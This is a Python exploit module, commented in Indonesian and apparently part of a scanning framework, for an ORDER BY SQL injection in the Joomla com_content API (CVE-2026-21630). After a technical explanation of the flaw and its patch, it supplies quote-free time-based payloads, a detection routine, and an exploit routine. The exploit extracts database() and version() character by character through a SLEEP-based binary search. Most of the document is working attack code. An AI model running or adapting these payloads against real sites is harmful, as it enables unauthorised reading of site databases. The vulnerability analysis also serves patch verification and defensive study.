#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2026-21630 — SQL injection pada ORDER BY di endpoint webservice com_content (articles).
Affected : Joomla! 4.0.0-5.4.3 dan 6.0.0-6.0.3   |   Patched: 5.4.4 / 6.0.4
NVD      : CVSS 3.1 8.8 / AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H · v4.0 6.9 PR:H (penilaian Joomla)

SUMBER (diff rilis resmi, bukan teks advisory):
  `libraries/src/MVC/Model/ListModel.php` (baru di 5.4.4)
        public function isValidFilterColumn($columnName): bool
        { return \in_array($columnName, $this->filter_fields, true); }
  `libraries/src/MVC/Controller/ApiController.php` :: displayList() (5.4.4)
        + if ($this->modelState->get('list.ordering')
        +     && !$model->isValidFilterColumn($this->modelState->get('list.ordering'))) {
        +     $model->setState('list.ordering', null);
        + }
        + if ($this->modelState->get('list.direction')
        +     && !\in_array(strtolower($this->modelState->get('list.direction')), ['asc','desc'], true)) {
        +     $model->setState('list.direction', 'asc');
        + }
        (plus cast (int) untuk limit/limitstart)

MEKANISME:
  api/components/com_content/src/Controller/ArticlesController.php (<=5.4.3) mengisi state model dari
  query string dengan pembersihan `STRING` saja:
        $this->modelState->set('list.ordering',  $filter->clean($apiListInfo['ordering'],  'STRING'));
        $this->modelState->set('list.direction', $filter->clean($apiListInfo['direction'], 'STRING'));
  Komponen API com_content tidak punya Model sendiri; ia memakai model administrator
  `administrator/components/com_content/src/Model/ArticlesModel.php` (585-598):
        $orderCol  = $this->state->get('list.ordering', 'a.id');
        $orderDirn = $this->state->get('list.direction', 'DESC');
        ...
        $ordering = $db->escape($orderCol) . ' ' . $db->escape($orderDirn);
        $query->order($ordering);
  `Joomla\Database\Mysqli\MysqliDriver::escape()` = mysqli_real_escape_string TANPA menambahkan tanda
  kutip (beda dari quote()), dan `Query::order()` (libraries/vendor/joomla/database/src/DatabaseQuery.php
  :1426) menyimpan fragmen apa adanya ke QueryElement('ORDER BY', ...) => nilai masuk ORDER BY sebagai
  fragmen SQL mentah. Karena escape() tetap meng-escape kutip/backslash, payload modul ini TIDAK memakai
  kutip sama sekali (kondisi dibandingkan dengan literal hex / bilangan).

BATAS VERSI (grep/diff kode pada paket rilis):
  5.4.3  tanpa guard          -> RENTAN      (fix = 5.4.4)
  5.4.4+ dengan guard         -> patched
  6.0.3  tanpa guard          -> RENTAN      (fix = 6.0.4)
  6.1.3  dengan guard         -> patched
  3.x    endpoint /api belum ada              -> tidak berlaku

BUKTI LAB (2026-11-09), mp-j603 (6.0.3, :8140) vs mp-j613 (6.1.3, :8141), PHP 8.3 + MySQL 8.0.46:
  token API uid 45 (grup 8 Super Users; plugin api-authentication/token default allowedUserGroups=[8])
  | payload (list[ordering])                                        | 6.0.3          | 6.1.3        |
  | baseline                                                        | 200 · 0.06s    | 200 · 0.07s  |
  | a.id))-- -                                                      | **500**        | 200          |
  | (SELECT SLEEP(3))                                               | **200 · 9.06s**| 200 · 0.05s  |
  | a.id,(SELECT 1 FROM(SELECT SLEEP(3))x)                          | **200 · 3.06s**| 200 · 0.05s  |
  | a.id,(SELECT 1 FROM(SELECT IF(SUBSTRING((SELECT database()),1,1)=0x6a,SLEEP(2),0))x) | **2.06s** | 0.05s |
  | ... =0x7a (salah)                                               | 0.055s         | 0.05s        |
  Artikel lab dibuat lewat API sendiri (POST content/articles) karena ORDER BY tidak dievaluasi pada
  set kosong.

AKTOR (jujur): butuh token API yang valid. Plugin token bawaan hanya mengizinkan grup Super Users
(default allowedUserGroups=[8]) sehingga dalam praktiknya PR:H seperti penilaian Joomla, bukan PR:L
seperti NVD. Modul menerima `--api-token` (token siap pakai) atau `--username/--password` (Basic auth
bila plugin api-authentication/basic aktif); token diperoleh pemilik akun dari halaman profilnya.
"""

import re
import time

from mp import (CveModule, ST_CLEAN, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN,
                ST_VULN, detect_platform, register, ver_lt)

MANIFEST = "/administrator/manifests/files/joomla.xml"
API_PATH = "/api/index.php/v1/content/articles"

PATCH_5 = (5, 4, 4)
PATCH_6 = (6, 0, 4)

SLEEP = 2         # detik bila kondisi benar
THRESH_F = 0.6    # ambang = 0.6 x sleep (delay nyata harus mendekati nilai SLEEP)
EXTRACT_LEN = 8   # jumlah karakter yang diekstrak per nilai (bisa diubah lewat --field-id)
EXPRS = (("database()", "database()"), ("version()", "version()"))


def _opt(opts, name):
    if opts is None:
        return None
    if isinstance(opts, dict):
        return opts.get(name)
    return getattr(opts, name, None)


def _ver_tuple(s):
    try:
        return tuple(int(x) for x in re.sub(r"[^0-9.]", "", str(s)).split(".") if x != "")
    except Exception:  # noqa: BLE001
        return ()


def _vulnerable(ver):
    """4.0.0-5.4.3 dan 6.0.0-6.0.3 -> rentan (fix 5.4.4 / 6.0.4)."""
    if not ver:
        return None
    if ver_lt(ver, (4, 0, 0)):
        return False          # endpoint /api belum ada di 3.x
    if ver_lt(ver, PATCH_5):
        return True
    if not ver_lt(ver, (6, 0, 0)) and ver_lt(ver, PATCH_6):
        return True
    return False


def _version(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200:
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text or "")
        if m:
            return _ver_tuple(m.group(1)), m.group(1)
    return None, ""


def _headers(opts):
    h = {"Accept": "application/vnd.api+json"}
    tok = _opt(opts, "api_token")
    if tok:
        h["X-Joomla-Token"] = tok
    return h


def _auth(opts):
    u = _opt(opts, "username")
    p = _opt(opts, "password")
    return (u, p) if u and p else (None, None)


def _probe(t, h, opts, ordering=None, direction=None, limit=5, timeout=30):
    """GET articles dengan list[ordering]/list[direction] kustom -> (status, elapsed, resp)."""
    params = {"list[limit]": str(limit)}
    if ordering:
        params["list[ordering]"] = ordering
    if direction:
        params["list[direction]"] = direction
    try:
        t0 = time.time()
        r = h.get(f"{t.url}{API_PATH}", params=params, headers=_headers(opts),
                  auth=_auth(opts), timeout=timeout, allow_redirects=False)
        return r.status_code, time.time() - t0, r
    except Exception:  # noqa: BLE001
        return None, None, None


def _payload(expr, sleep=SLEEP):
    """Fragmen ORDER BY: subquery bernama berisi IF(kondisi, SLEEP, 0) — tanpa karakter kutip."""
    return f"a.id,(SELECT 1 FROM(SELECT IF({expr},SLEEP({sleep}),0))x)"


def _is_true(t, h, opts, expr, base, sleep=SLEEP):
    """True bila kondisi SQL bernilai benar (delay terukur relatif terhadap baseline)."""
    _, el, _ = _probe(t, h, opts, ordering=_payload(expr, sleep))
    if el is None or base is None:
        return None
    return el >= base + max(0.4, THRESH_F * sleep)


def _extract(t, h, opts, expr, pos, base, lo=32, hi=126):
    """Ambil ASCII karakter ke-pos dari (SELECT expr) dengan binary search boolean."""
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f"(SELECT ASCII(SUBSTRING((SELECT {expr}),{pos},1)))>{mid}"
        res = _is_true(t, h, opts, cond, base, sleep=1)
        if res is None:
            return None
        if res:
            lo = mid + 1
        else:
            hi = mid
    return lo if 32 <= lo <= 126 else None


def check(t, h, opts):
    """NON-DESTRUKTIF: bandingkan waktu respons baseline vs kondisi benar/salah.

    Tidak menulis apa pun ke target; hanya membaca daftar artikel (read-only).
    """
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    ver, raw = _version(t, h)
    detail = f"joomla={raw or '?'}"
    vul = _vulnerable(ver)
    if vul is False:
        return ST_CLEAN, f"Joomla {raw} sudah dipatch (>= 5.4.4 / 6.0.4)", detail
    if not (_opt(opts, "api_token") or _opt(opts, "username")):
        lvl = ST_INFO if vul else ST_UNKNOWN
        return (lvl,
                "Joomla API com_content dalam rentang rentan; butuh --api-token (atau "
                "--username/--password bila Basic aktif) untuk membuktikan injeksi",
                detail + " requires=token-api")

    st_code, base, _ = _probe(t, h, opts)
    if st_code in (401, 403):
        return (ST_INFO,
                f"Joomla {raw or '?'} — API menolak autentikasi ({st_code}); periksa token dan "
                f"keanggotaan grup (plugin token bawaan hanya mengizinkan Super Users)",
                detail + f" | http={st_code}")
    if st_code is None or base is None:
        return ST_UNKNOWN, f"Joomla {raw or '?'} — endpoint API tidak merespons", detail

    t_true = t_false = None
    _, t_true, _ = _probe(t, h, opts, ordering=_payload("1=1"))
    _, t_false, _ = _probe(t, h, opts, ordering=_payload("1=0"))
    _, t_err, r_err = _probe(t, h, opts, ordering="a.id))-- -")
    ev = (f"baseline={base:.2f}s true={t_true if t_true is None else round(t_true, 2)}s "
          f"false={t_false if t_false is None else round(t_false, 2)}s "
          f"syntax={t_err if t_err is None else round(t_err, 2)}s/http={st_code}"
          + (f"->{r_err.status_code}" if r_err is not None else "") + f" | {detail}")

    thresh = max(0.4, THRESH_F * SLEEP)
    if t_true is not None and base is not None and t_true >= base + thresh \
            and (t_false is None or t_false < base + thresh):
        return (ST_VULN,
                f"Joomla {raw or '?'} — ORDER BY injectable pada endpoint articles API "
                f"(delay {t_true - base:.2f}s dengan kondisi benar, tanpa delay saat salah)",
                ev)
    if r_err is not None and r_err.status_code >= 500:
        return (ST_VULN,
                f"Joomla {raw or '?'} — fragmen ORDER BY masuk ke query (error {r_err.status_code}); "
                f"delay tidak terukur (mungkin tanpa baris hasil)",
                ev)
    return (ST_CLEAN if vul is False else ST_INFO,
            f"Joomla {raw or '?'} — tidak ada sinyal injeksi ORDER BY lewat list[ordering]",
            ev)


def exploit(t, h, opts):
    """
    Outcome terkontrol: bukti pembacaan data dari database lewat injeksi ORDER BY —
    ekstraksi `database()` dan `version()` secara boolean/time-based (read-only,
    tidak menulis apa pun ke target).
    """
    ver, raw = _version(t, h)
    if ver and _vulnerable(ver) is False:
        return ST_CLEAN, f"Joomla {raw} sudah dipatch (>= 5.4.4 / 6.0.4)", f"joomla={raw}"
    if not (_opt(opts, "api_token") or _opt(opts, "username")):
        return (ST_INFO, "butuh --api-token atau --username/--password untuk membuktikan injeksi",
                f"joomla={raw or '?'}")

    _, base, _ = _probe(t, h, opts)
    if base is None:
        return ST_UNKNOWN, f"Joomla {raw or '?'} — endpoint API tidak merespons", ""
    _, t_true, _ = _probe(t, h, opts, ordering=_payload("1=1"))
    if t_true is None or t_true < base + max(0.4, THRESH_F * SLEEP):
        return (ST_CLEAN,
                f"Joomla {raw or '?'} — tidak ada delay pada kondisi benar: urutan tidak injectable "
                f"(sudah dipatch atau endpoint lain)",
                f"baseline={base:.2f}s true={t_true}s | joomla={raw or '?'}")

    m = _opt(opts, "field_id") or 0
    nlen = int(m) if int(m or 0) > 0 else EXTRACT_LEN
    got = {}
    for label, expr in EXPRS:
        chars = []
        for pos in range(1, nlen + 1):
            c = _extract(t, h, opts, expr, pos, base)
            if c is None:
                break
            chars.append(chr(c))
            if c == 32:      # spasi/karakter kosong -> akhir nilai
                chars.pop()
                break
        got[label] = "".join(chars)

    ev = (f"joomla={raw or '?'} | baseline={base:.2f}s | injeksi ORDER BY terbukti | "
          + " ".join(f"{k}={v!r}" for k, v in got.items()))
    if got.get("database()") or got.get("version()"):
        return (ST_PWN,
                "SQL injection ORDER BY terkonfirmasi — data dibaca dari database: "
                + ", ".join(f"{k}={v!r}" for k, v in got.items() if v),
                ev)
    return (ST_VULN, "injeksi ORDER BY terbukti (delay terukur) tetapi ekstraksi tidak konklusif", ev)


register(CveModule(
    cve="CVE-2026-21630",
    cluster="joomla_core",
    title="Joomla Core - SQL injection pada ORDER BY di endpoint webservice articles "
          "(list[ordering]/list[direction])",
    vclass="sql injection",
    cvss="8.8",
    severity="high",
    cwe="CWE-89",
    product="Joomla! Core (libraries/src/MVC/Controller/ApiController.php + "
            "administrator/components/com_content/src/Model/ArticlesModel.php)",
    versions_affected="4.0.0-5.4.3; 6.0.0-6.0.3",
    status="verified",
    requires=[
        "token API Joomla yang valid (--api-token), atau --username/--password bila plugin "
        "api-authentication/basic aktif",
        "plugin token bawaan hanya mengizinkan Super Users (allowedUserGroups=[8]) sehingga "
        "praktiknya PR:H — NVD menandai PR:L",
        "endpoint /api/index.php/... (Joomla 4.0+); jalur read-only, tanpa syarat data artikel "
        "(ORDER BY dievaluasi saat ada >=1 baris)",
        "--field-id dipakai sebagai jumlah karakter yang diekstrak (default 8)",
    ],
    check=check,
    exploit=exploit,
    notes=(
        "Sink <=5.4.3: ApiController::displayList() menyalin list.ordering/list.direction dari "
        "request (filter STRING saja) ke state model; ArticlesModel (administrator, dipakai juga "
        "oleh API karena komponen api/com_content tidak punya Model) membangun "
        "$db->escape($orderCol).' '.$db->escape($orderDirn) lalu $query->order($ordering). "
        "escape() pada driver mysqli tidak menambah kutip dan Query::order() (DatabaseQuery.php:1426) "
        "tidak memvalidasi => fragmen SQL mentah. Fix 5.4.4: ListModel::isValidFilterColumn() "
        "(in_array terhadap filter_fields) + guard di ApiController untuk ordering/direction serta "
        "cast (int) limit/limitstart. Payload modul menghindari kutip (dibandingkan dengan bilangan "
        "via ASCII/SUBSTRING) karena escape() tetap meng-escape kutip/backslash. Bukti lab 2026-11-09: "
        "6.0.3 @8140 -> syntax 500, SLEEP(3) 9.06s, boolean 2.06s vs 0.055s; 6.1.3 @8141 -> semua "
        "~0.05s. Kelas bug ini menyeluruh (semua endpoint API yang memakai displayList()); modul "
        "hanya menguji endpoint articles."
    ),
))
